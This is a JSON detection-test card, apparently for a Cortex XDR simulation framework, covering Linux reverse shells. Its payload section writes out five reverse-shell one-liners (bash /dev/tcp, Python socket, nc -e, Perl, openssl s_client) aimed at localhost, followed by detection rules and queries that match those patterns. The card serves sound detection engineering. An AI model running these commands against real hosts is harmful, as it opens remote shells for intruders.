@@ -1,0 +1,398 @@
+{
+  "id": "TTP-2026-0033",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-06-02T00:00:00Z",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      },
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "reviewer"
+      }
+    ],
+    "tags": [
+      "plane-edr",
+      "vector-reverse-shell",
+      "industry-all",
+      "severity-high",
+      "endpoint",
+      "linux"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "safe-by-design"
+    }
+  },
+  "identity": {
+    "name": "Linux Reverse Shell \u2014 Multi-Method C2 Callback (T1059.004)",
+    "summary": "A web service account spawns interactive shells that redirect stdio over a socket using five reverse-shell methods: bash /dev/tcp, a Python socket+subprocess one-liner, netcat -e, a Perl socket one-liner, and OpenSSL s_client. Cortex XDR for Linux flags each interpreter pattern via command-line BIOCs and stitches the multi-method sequence into one C2 incident.",
+    "description": "Reverse shells are the workhorse C2 primitive on compromised Linux servers \u2014 Mirai and its variants drop them after exploiting exposed services, then pivot to crypto-mining or botnet enrollment. This scenario exercises the five canonical Linux reverse-shell methods from a non-interactive service account: bash with /dev/tcp redirection, Python importing socket+subprocess, netcat with the -e shell-exec flag, a Perl Socket one-liner, and OpenSSL s_client for an encrypted channel. The detection approach is command-line behavioral analysis: each method has a distinctive process invocation that a Cortex XDR BIOC matches verbatim, while an analytics layer recognizes an interpreter spawned by a service account performing socket operations. A correlation rule fuses the five attempts from one process lineage into a single high-severity command-and-control incident, demonstrating XSIAM stitching even though every connection in the lab targets localhost.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": [
+      {
+        "name": "Mirai"
+      }
+    ],
+    "industries_targeted": [
+      "technology"
+    ],
+    "first_observed": "2016-08-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0011",
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Command and Control",
+          "Execution"
+        ],
+        "subtechnique_id": "T1059.004"
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter: Python",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ],
+        "subtechnique_id": "T1059.006"
+      },
+      {
+        "technique_id": "T1071",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ],
+        "subtechnique_id": "T1071.001"
+      },
+      {
+        "technique_id": "T1573",
+        "name": "Encrypted Channel: Asymmetric Cryptography",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ],
+        "subtechnique_id": "T1573.002"
+      }
+    ],
+    "kill_chain_phase": "command-and-control",
+    "data_sources": [
+      "Process: Process Creation",
+      "Command: Command Execution",
+      "Network Traffic: Network Connection Creation"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1059.004 \u2014 Atomic Test (bash /dev/tcp reverse shell) and related socket one-liners",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR Linux agent installed and reporting healthy on the target.",
+        "check_command": "systemctl is-active cortex-agent || ps aux | grep -i traps"
+      },
+      {
+        "description": "Lab environment matching scenario SIM-EDR-002 requirements (interpreters bash/python3/perl/openssl and optionally nc available)."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# All connections target localhost \u2014 safe by design.\ntimeout 5 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null\ntimeout 5 python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(3);s.connect(('127.0.0.1',4445));exit()\" 2>/dev/null\ntimeout 5 nc -e /bin/sh 127.0.0.1 4446 2>/dev/null || timeout 5 ncat -e /bin/sh 127.0.0.1 4446 2>/dev/null\ntimeout 5 perl -e 'use Socket;$i=\"127.0.0.1\";$p=4447;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exit();' 2>/dev/null\ntimeout 5 openssl s_client -quiet -connect 127.0.0.1:4448 2>/dev/null",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "bash spawned with -i and /dev/tcp redirection in its command line.",
+        "expected_value": "actor_process_image_name = \"bash\" and command_line contains \"/dev/tcp/\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "python3 invoked with inline socket+subprocess code.",
+        "expected_value": "actor_process_image_name = \"python3\" and command_line contains \"socket\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "nc/ncat invoked with -e shell-exec flag.",
+        "expected_value": "actor_process_image_name in (\"nc\",\"ncat\") and command_line contains \"-e\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "perl invoked with inline Socket/connect code.",
+        "expected_value": "actor_process_image_name = \"perl\" and command_line contains \"sockaddr_in\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "openssl s_client connecting outbound from a service account.",
+        "expected_value": "actor_process_image_name = \"openssl\" and command_line contains \"s_client\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound TCP connection initiated by an interpreter process.",
+        "expected_value": "dst_port in (4444,4445,4446,4447,4448)"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "echo '[CortexSim] SIM-EDR-002 cleanup complete \u2014 no artifacts to remove (all simulated to localhost)'"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [
+      {
+        "name": "EDR-002 Bash devtcp Reverse Shell Redirection",
+        "description": "Bash reverse shell pattern \u2014 /dev/tcp redirection detected by XDR Agent behavioral rule. bash -i is launched with its stdio redirected to a /dev/tcp socket.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"bash\", \"sh\")\n| filter action_process_image_command_line contains \"/dev/tcp/\"\n| filter action_process_image_command_line contains_any (\">&\", \"0>&1\", \"0<&\")",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1059.004"
+        ]
+      },
+      {
+        "name": "EDR-002 Interactive Bash From Service Account With Network Redirect",
+        "description": "Interactive bash spawned from service account with network redirect \u2014 C2 callback pattern. An interactive shell with a socket redirect runs under a non-login service identity.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"bash\", \"sh\")\n| filter action_process_image_command_line contains \"-i\"\n| filter action_process_image_command_line contains \"/dev/tcp/\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"node\", \"apache\", \"nginx\")",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1059.004"
+        ]
+      },
+      {
+        "name": "EDR-002 Python Socket Subprocess Reverse Shell",
+        "description": "Python reverse shell pattern \u2014 socket+subprocess import with connect call from service account. python3 -c imports socket and subprocess and calls connect().",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"python\", \"python3\")\n| filter action_process_image_command_line contains \"socket\"\n| filter action_process_image_command_line contains_any (\"subprocess\", \"pty\", \".connect(\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1059.006"
+        ]
+      },
+      {
+        "name": "EDR-002 Netcat Shell Exec Flag Reverse Shell",
+        "description": "Netcat with -e flag \u2014 classic reverse shell pattern detected by endpoint BIOC rule. nc/ncat is invoked with -e/-c to pipe a shell.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"nc\", \"ncat\", \"netcat\")\n| filter action_process_image_command_line contains_any (\"-e /bin/sh\", \"-e /bin/bash\", \" -e \", \"-c /bin/sh\")",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1059.004"
+        ]
+      },
+      {
+        "name": "EDR-002 Perl Socket Reverse Shell One-Liner",
+        "description": "Perl socket-based reverse shell pattern \u2014 one-liner execution from service account. perl -e contains Socket/connect/sockaddr_in.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"perl\"\n| filter action_process_image_command_line contains \"Socket\"\n| filter action_process_image_command_line contains_any (\"sockaddr_in\", \"connect(\", \"inet_aton\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1059.004"
+        ]
+      },
+      {
+        "name": "EDR-002 OpenSSL s_client Encrypted C2 From Service Account",
+        "description": "OpenSSL s_client invoked from non-interactive service account \u2014 encrypted C2 channel attempt. openssl s_client opens an outbound TLS channel from a service identity.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"openssl\"\n| filter action_process_image_command_line contains \"s_client\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"node\", \"apache\", \"nginx\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1573.002"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "EDR-002 Analytics Interactive Shell Network Redirect",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"bash\", \"sh\")\n| filter action_process_image_command_line contains \"/dev/tcp/\"\n| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-002 Analytics Python Socket Ops By Service Account",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"python\", \"python3\")\n| filter action_process_image_command_line contains \"socket\"\n| filter actor_effective_username != \"root\"\n| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-002 Analytics Network Utility Shell Flag",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"nc\", \"ncat\", \"netcat\")\n| filter action_process_image_command_line contains \"-e\"\n| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-002 Analytics Multi-Method Reverse Shell Sequence",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"bash\", \"sh\", \"python\", \"python3\", \"nc\", \"ncat\", \"perl\", \"openssl\")\n| filter action_process_image_command_line contains_any (\"/dev/tcp/\", \"socket\", \"-e /bin/\", \"sockaddr_in\", \"s_client\")\n| comp count_distinct(actor_process_image_name) as method_count by agent_hostname, causality_actor_process_instance_id\n| filter method_count >= 2",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Reverse Shell Multi-Method C2 \u2014 Same Lineage",
+        "rule_id": "CR-EDR-0002",
+        "logic": "BIOC(EDR-002 Bash devtcp Reverse Shell Redirection) OR BIOC(EDR-002 Interactive Bash From Service Account With Network Redirect) OR BIOC(EDR-002 Python Socket Subprocess Reverse Shell) OR BIOC(EDR-002 Netcat Shell Exec Flag Reverse Shell) OR BIOC(EDR-002 Perl Socket Reverse Shell One-Liner) OR BIOC(EDR-002 OpenSSL s_client Encrypted C2 From Service Account)"
+      }
+    ],
+    "analytics_modules": [
+      "Cortex XDR Analytics \u2014 Service account spawning interpreter with outbound socket",
+      "Cortex XDR Behavioral Threat Protection \u2014 Reverse shell cluster"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "agent-traps",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "BTP-REVSHELL-LINUX-001"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro",
+        "evidence_query": "preset:prevention | filter rule_name contains \"Reverse Shell\""
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "behavioral-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-EDR-0033-DEVTCP",
+          "XDR-BIOC-EDR-0033-NC",
+          "XDR-BIOC-EDR-0033-PY"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro",
+        "evidence_query": "preset = xdr_data | filter action_process_image_command_line contains \"/dev/tcp/\" | fields _time, agent_hostname, action_process_image_command_line"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-EDR-0002"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-EDR-0002 fuses multi-method reverse-shell attempts from one lineage into a single C2 incident."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-RANSOM-033",
+        "name": "Command and Control Detection \u2014 Linux Reverse Shells",
+        "description": "Detect reverse-shell C2 establishment across bash, python, netcat, perl and openssl from a service account, and stitch them into one incident.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-RANSOM-033A",
+            "objective": "Each reverse-shell method fires its corresponding Cortex XDR BIOC.",
+            "preconditions": [
+              "Cortex XDR Linux agent >= 8.4.0 installed and healthy.",
+              "BIOCs from this card imported and enabled."
+            ],
+            "steps": [
+              "Run SIM-EDR-002 steps 1-5.",
+              "Observe BIOC alerts per method in the Cortex console."
+            ],
+            "success_criteria": [
+              "BIOC `EDR-002 Bash devtcp Reverse Shell Redirection` fires within 60s.",
+              "BIOC `EDR-002 Netcat Shell Exec Flag Reverse Shell` fires when nc is present.",
+              "All four XQL validation queries return >= 1 row."
+            ],
+            "expected_score_weight": 0.6
+          },
+          {
+            "test_case_id": "TC-RANSOM-033B",
+            "objective": "Multi-method attempts stitch into a single C2 incident.",
+            "success_criteria": [
+              "Correlation `CR-EDR-0002` groups the methods from one process lineage into one incident.",
+              "Incident severity is High or Critical."
+            ],
+            "expected_score_weight": 0.4
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Enable Cortex XDR Behavioral Threat Protection reverse-shell prevention in Block mode on server tiers.",
+      "Run application services under least-privilege accounts with no interactive shell.",
+      "Restrict egress from server subnets with default-deny firewall policy.",
+      "Remove or restrict netcat-traditional, and audit interpreter availability on production hosts."
+    ],
+    "detection_engineering": [
+      "Alert on any interpreter command line containing /dev/tcp/, socket+subprocess, nc -e, perl Socket, or openssl s_client from non-root service accounts.",
+      "Correlate outbound socket creation with the spawning interpreter process to confirm callback intent.",
+      "Hunt for short-lived interpreter processes with network connections to high non-standard ports."
+    ],
+    "response_playbook": "XSOAR-PB-C2ReverseShellResponse-v1"
+  },
+  "references": [
+    {
+      "title": "Unit42 - Mirai Variant Targets Linux and IoT Devices",
+      "url": "https://unit42.paloaltonetworks.com/mirai-variant-v3g4/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.004 \u2014 Unix Shell",
+      "url": "https://attack.mitre.org/techniques/T1059/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-EDR-002."
+    },
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-06-02",
+      "author": "Henry Reed",
+      "change": "Replaced skeleton detections with real Linux XDR reverse-shell BIOCs/XQL, added correlation CR-EDR-0002, enriched identity + panw_mapping. Promoted to active."
+    }
+  ]
+}
